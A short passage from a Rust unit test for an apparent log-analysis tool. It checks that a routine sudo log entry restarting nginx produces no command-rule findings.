            "Oct 10 15:03:00 web01 sudo:   admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx\n",
        );
        let t = analyze_path(&d.0, &opts()).unwrap();
        assert!(
            t.findings.iter().all(|f| !f.rule.starts_with("cmd-")),
            "{:#?}",
            t.findings
        );
    }
}
